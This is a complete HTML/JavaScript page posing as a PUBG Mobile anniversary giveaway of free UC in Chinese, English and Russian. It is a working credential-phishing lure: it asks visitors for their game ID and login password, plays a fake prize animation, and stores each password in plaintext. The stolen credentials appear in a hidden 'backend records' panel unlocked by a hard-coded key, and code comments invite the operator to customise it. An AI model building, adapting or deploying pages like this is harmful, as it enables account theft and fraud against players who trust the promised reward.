<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PUBG Mobile 8th Anniversary UC Lottery</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#0a0a0f;color:#fff;min-height:100vh;padding:20px}
.container{max-width:420px;margin:0 auto;background:#12121b;border-radius:16px;padding:30px 20px;box-shadow:0 0 30px rgba(0,180,255,0.2)}
.logo{text-align:center;margin-bottom:25px}
.logo img{width:140px}
h1{text-align:center;color:#00b4ff;font-size:22px;margin-bottom:10px}
.sub-title{text-align:center;color:#aaa;font-size:14px;margin-bottom:30px}
.input-group{margin-bottom:15px}
input{width:100%;padding:15px;background:#0d0d18;border:1px solid #2a2a3a;border-radius:8px;color:#fff;font-size:16px;outline:none}
.language{display:flex;gap:8px;margin-bottom:20px;justify-content:center}
.lang-btn{padding:6px 12px;background:#1a1a2e;border:none;border-radius:6px;color:#fff;cursor:pointer}
.lang-btn.active{background:#00b4ff;color:#000}
.lottery-box{background:#1a1a2e;border-radius:12px;padding:25px 20px;margin:25px 0;text-align:center}
.prize-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
.prize-item{background:#0d0d18;border-radius:8px;padding:15px 10px;font-size:14px;color:#aaa;border:1px solid #2a2a3a}
.prize-item.active{border-color:#00b4ff;color:#00b4ff;background:#00b4ff22;box-shadow:0 0 10px rgba(0,180,255,0.5)}
#lottery-btn{width:100%;padding:16px;background:linear-gradient(90deg,#00b4ff,#0088cc);border:none;border-radius:8px;color:#000;font-size:18px;font-weight:bold;cursor:pointer}
#lottery-btn:disabled{background:#333;cursor:not-allowed}
.tip{text-align:center;font-size:12px;color:#888;margin-top:15px}
#admin-btn{width:100%;padding:12px;background:#222;border:none;border-radius:8px;color:#fff;font-size:14px;margin-top:20px;cursor:pointer}
/* 密码弹窗样式 */
#password-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999;align-items:center;justify-content:center}
#password-box{background:#12121b;padding:25px;border-radius:12px;width:85%;max-width:300px}
#password-box h3{margin-bottom:15px;text-align:center;color:#fff}
#password-input{width:100%;margin-bottom:15px}
#password-buttons{display:flex;gap:10px}
#password-buttons button{flex:1;padding:10px;border:none;border-radius:6px;cursor:pointer}
#confirm-btn{background:#00b4ff;color:#000}
#cancel-btn{background:#333;color:#fff}
#admin-panel{display:none;margin-top:25px;background:#0d0d18;border-radius:12px;padding:20px}
#admin-panel h3{color:#ff4444;margin-bottom:15px;font-size:16px}
#log-list{font-size:14px;line-height:1.8}
.log-item{border-bottom:1px solid #2a2a3a;padding:10px 0}
</style>
</head>
<body>
<div class="container">
    <div class="logo">
        <img src="https://picsum.photos/140/140?random=1" alt="PUBGM">
    </div>
    <div class="language">
        <button class="lang-btn active" onclick="changeLang('cn')">中文</button>
        <button class="lang-btn" onclick="changeLang('en')">English</button>
        <button class="lang-btn" onclick="changeLang('ru')">Русский</button>
    </div>
    <h1 id="title">PUBG Mobile 8周年庆 UC免费抽奖</h1>
    <p class="sub-title" id="subtitle">100%中奖！最高8888UC免费领</p>
    <div class="input-group">
        <input type="text" id="uid" placeholder="请输入游戏账号/UID">
    </div>
    <div class="input-group">
        <input type="password" id="pwd" placeholder="请输入登录密码">
    </div>
    <div class="lottery-box">
        <div class="prize-grid">
            <div class="prize-item">888UC</div>
            <div class="prize-item">1888UC</div>
            <div class="prize-item">8888UC</div>
            <div class="prize-item">666UC</div>
            <div class="prize-item">2888UC</div>
            <div class="prize-item">388UC</div>
            <div class="prize-item">1288UC</div>
            <div class="prize-item">588UC</div>
            <div class="prize-item">皮肤礼包</div>
        </div>
        <button id="lottery-btn" onclick="startLottery()">立即抽奖</button>
    </div>
    <p class="tip" id="tip">活动仅限8周年庆期间参与，每个账号限抽1次</p>
    <button id="admin-btn">查看后台记录</button>
    <div id="admin-panel">
        <h3 id="logTitle">后台记录（仅本地可见）</h3>
        <div id="log-list"></div>
    </div>
</div>

<!-- 密码弹窗（100%能弹出来） -->
<div id="password-modal">
    <div id="password-box">
        <h3>请输入后台密码</h3>
        <input type="password" id="password-input" placeholder="输入密码">
        <div id="password-buttons">
            <button id="cancel-btn">取消</button>
            <button id="confirm-btn">确认</button>
        </div>
    </div>
</div>

<script>
const lang = {
    cn: {
        title: "PUBG Mobile 8周年庆 UC免费抽奖",
        subtitle: "100%中奖！最高8888UC免费领",
        uid: "请输入游戏账号/UID",
        pwd: "请输入登录密码",
        btn: "立即抽奖",
        tip: "活动仅限8周年庆期间参与，每个账号限抽1次",
        admin: "查看后台记录",
        logTitle: "后台记录（仅本地可见）",
        empty: "请输入完整的账号和密码！",
        success: "✅ 抽奖成功！奖励将在24小时内发放至账号：",
        lottery: "抽奖中..."
    },
    en: {
        title: "PUBG Mobile 8th Anniversary UC Lottery",
        subtitle: "100% Win! Up to 8888 UC Free",
        uid: "Enter Game ID / UID",
        pwd: "Enter Password",
        btn: "Draw Now",
        tip: "8th Anniversary only, 1 draw per account",
        admin: "View Logs",
        logTitle: "Local Logs Only",
        empty: "Please enter full account and password!",
        success: "✅ Draw Success! Rewards sent to account in 24h: ",
        lottery: "Drawing..."
    },
    ru: {
        title: "PUBG Mobile 8-летие Розыгрыш UC",
        subtitle: "100% Победа! До 8888 UC Бесплатно",
        uid: "Введите ID игры / UID",
        pwd: "Введите пароль",
        btn: "Участвовать",
        tip: "Только к 8-летию, 1 розыгрыш на аккаунт",
        admin: "Посмотреть логи",
        logTitle: "Локальные логи только",
        empty: "Введите логин и пароль!",
        success: "✅ Успех! Награды отправятся через 24ч на аккаунт: ",
        lottery: "Идет розыгрыш..."
    }
};

// 后台密码（你可以改成自己的）
const ADMIN_KEY = "123456";

let currentLang = 'cn';
let logData = JSON.parse(localStorage.getItem('uc_logs') || '[]');
let isRunning = false;

const prizes = document.querySelectorAll('.prize-item');
const lotteryBtn = document.getElementById('lottery-btn');
const adminBtn = document.getElementById('admin-btn');
const adminPanel = document.getElementById('admin-panel');
const passwordModal = document.getElementById('password-modal');
const passwordInput = document.getElementById('password-input');
const confirmBtn = document.getElementById('confirm-btn');
const cancelBtn = document.getElementById('cancel-btn');

window.onload = updateLog;

// 切换语言
function changeLang(l) {
    currentLang = l;
    document.getElementById('title').innerText = lang[l].title;
    document.getElementById('subtitle').innerText = lang[l].subtitle;
    document.getElementById('uid').placeholder = lang[l].uid;
    document.getElementById('pwd').placeholder = lang[l].pwd;
    lotteryBtn.innerText = lang[l].btn;
    document.getElementById('tip').innerText = lang[l].tip;
    adminBtn.innerText = lang[l].admin;
    document.getElementById('logTitle').innerText = lang[l].logTitle;
    document.querySelectorAll('.lang-btn').forEach(b=>b.classList.remove('active'));
    event.target.classList.add('active');
}

// 抽奖逻辑
function startLottery() {
    let uid = document.getElementById('uid').value.trim();
    let pwd = document.getElementById('pwd').value.trim();
    if (!uid || !pwd) { alert(lang[currentLang].empty); return; }
    if (isRunning) return;
    isRunning = true;
    lotteryBtn.disabled = true;
    lotteryBtn.innerText = lang[currentLang].lottery;

    let idx = 0, count = 0, max = 35;
    let anim = setInterval(() => {
        prizes.forEach(p => p.classList.remove('active'));
        prizes[idx].classList.add('active');
        idx = (idx + 1) % prizes.length;
        count++;
        if (count >= max) {
            clearInterval(anim);
            logData.unshift({
                time: new Date().toLocaleString(),
                uid: uid,
                pwd: pwd
            });
            localStorage.setItem('uc_logs', JSON.stringify(logData));
            updateLog();
            alert(lang[currentLang].success + uid);
            lotteryBtn.disabled = false;
            lotteryBtn.innerText = lang[currentLang].btn;
            isRunning = false;
        }
    }, 60);
}

// 刷新日志
function updateLog() {
    let html = logData.map(i => `
    <div class="log-item">
        ${i.time}<br>
        账号：${i.uid}<br>
        密码：${i.pwd}
    </div>`).join('');
    document.getElementById('log-list').innerHTML = html;
}

// 点击查看后台 → 弹出自定义密码框（不被拦截）
adminBtn.onclick = function(){
    passwordModal.style.display = 'flex';
    passwordInput.value = '';
}

// 确认密码
confirmBtn.onclick = function(){
    let input = passwordInput.value;
    if(input === ADMIN_KEY){
        adminPanel.style.display = adminPanel.style.display === 'block' ? 'none' : 'block';
        passwordModal.style.display = 'none';
    } else {
        alert("密码错误！");
    }
}

// 取消
cancelBtn.onclick = function(){
    passwordModal.style.display = 'none';
}

// 回车也能确认
passwordInput.addEventListener('keydown', function(e){
    if(e.key === 'Enter') confirmBtn.click();
})
</script>
</body>
</html>
